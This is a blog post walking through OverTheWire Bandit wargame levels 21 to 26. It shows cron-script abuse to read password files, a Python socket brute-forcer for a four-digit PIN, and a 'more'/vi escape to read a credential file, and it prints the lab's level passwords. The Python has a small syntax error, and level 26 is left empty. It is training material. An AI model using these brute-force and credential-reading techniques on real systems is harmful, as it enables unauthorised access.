---
title: "Linux training with overthewire [Part 3/10: Bandit 21-30]"
author: Florian Courgey
layout: post
categories:
  - opensource
  - linux
  - bash
  - shell
  - hack
  - server
---
Excerpt here...
<!--more-->

This post is part of a series:
- [Linux training with overthewire Part 1: Bandit 1-10]({% post_url 2018-11-30-linux-training %})
- [Linux training with overthewire Part 2: Bandit 11-20]({% post_url 2018-11-30-linux-training-2 %})
- Linux training with overthewire Part 3: Bandit 21-30
- [Linux training with overthewire Part 4: Natas]({% post_url 2018-11-30-linux-training-4 %})

### Level 21 - CRON
```bash
ssh -p 2220 bandit21@bandit.labs.overthewire.org
# gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr http://overthewire.org/wargames/bandit/bandit22.html
```
```bash
$ cat /etc/cron.d/
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
$ cat /usr/bin/cronjob_bandit22.sh
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
```

### Level 22 - Bash script 1
```bash
ssh -p 2220 bandit22@bandit.labs.overthewire.org
# Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI http://overthewire.org/wargames/bandit/bandit23.html
```
```bash
$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash
myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
$ myname=bandit23 && echo $(echo I am user $myname | md5sum | cut -d ' ' -f 1)
8ca319486bfbbc3663ea0fbe81326349
$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```

### Level 23 - Bash script 2
```bash
ssh -p 2220 bandit23@bandit.labs.overthewire.org
# jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n http://overthewire.org/wargames/bandit/bandit24.html
```
```bash
$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
$ ls /var/spool/bandit24/
lol.sh  script.sh
$ cat /var/spool/bandit24/*
#!/bin/sh
cat /etc/bandit_pass/bandit24 > /tmp/tmp.AuFwziaI3a/lol.txt
$ cat /tmp/tmp.AuFwziaI3a/lol.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

### Level 24 - Bruteforce script (in `python`)
```bash
ssh -p 2220 bandit24@bandit.labs.overthewire.org
# UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ http://overthewire.org/wargames/bandit/bandit25.html
```
Let's test first with `nc`
```bash
$ echo "$(cat /etc/bandit_pass/bandit24) 0000" | nc localhost 30002
Wrong! Please enter the correct pincode. Try again.
```
Now that we have our Bad Boy (Wrong...), it's Bruteforce time! From 0000 to 9999. I choose python and the standard `socket` library:
- `bytes_data = socket.recv(buffer_size)` to receive data
- `socket.sendall(bytes_data)` to send data

Quick test in python 3:
```bash
$ cd $(mktemp -d) && vim main.py
```
```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 30002)); s.recv(1024) # to remove first banner msg
for i in range(0,3):
    s.sendall(str.encode('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ '+str(i)+'\n'))
    print(s.recv(1024).decode()) # print response
```
```bash
$ python3 main.py
b'Wrong! Please enter the correct pincode. Try again.\n'
b'Wrong! Please enter the correct pincode. Try again.\n'
b'Wrong! Please enter the correct pincode. Try again.\n'
```

Full code in python:
```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 30002)); s.recv(1024)
for i in range(0,9999):
    pin = str(i).zfill(4)
    if i%100 == 0:
      print('Sending '+pin)
    s.sendall(str.encode('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ '+pin+'\n'))
    data = s.recv(1024).decode()
    if not data.startswith('Wrong'):
      print('PIN '+pin+': 'data)
      exit()
```
```terminal
Sending 0000
Sending 0100
Sending 0200
Sending 0300
PIN 0378: Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```

### Level 25 - Custom shell
```bash
ssh -p 2220 bandit25@bandit.labs.overthewire.org
# uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG http://overthewire.org/wargames/bandit/bandit26.html
```

Exploit of the `more` command by reducing terminal's height so `more` hangs. This way we can execute command such as `v` to fire up a `vi` editor.

Then in `vi`: `:r /etc/bandit_pass/bandit26`.

5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z

### Level 26 -
```bash
ssh -p 2220 bandit26@bandit.labs.overthewire.org
# 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z http://overthewire.org/wargames/bandit/bandit27.html
```



This post is part of a series:
- [Linux training with overthewire Part 1: Bandit 1-10]({% post_url 2018-11-30-linux-training %})
- [Linux training with overthewire Part 2: Bandit 11-20]({% post_url 2018-11-30-linux-training-2 %})
- Linux training with overthewire Part 3: Bandit 21-30
- [Linux training with overthewire Part 4: Natas]({% post_url 2018-11-30-linux-training-4 %})
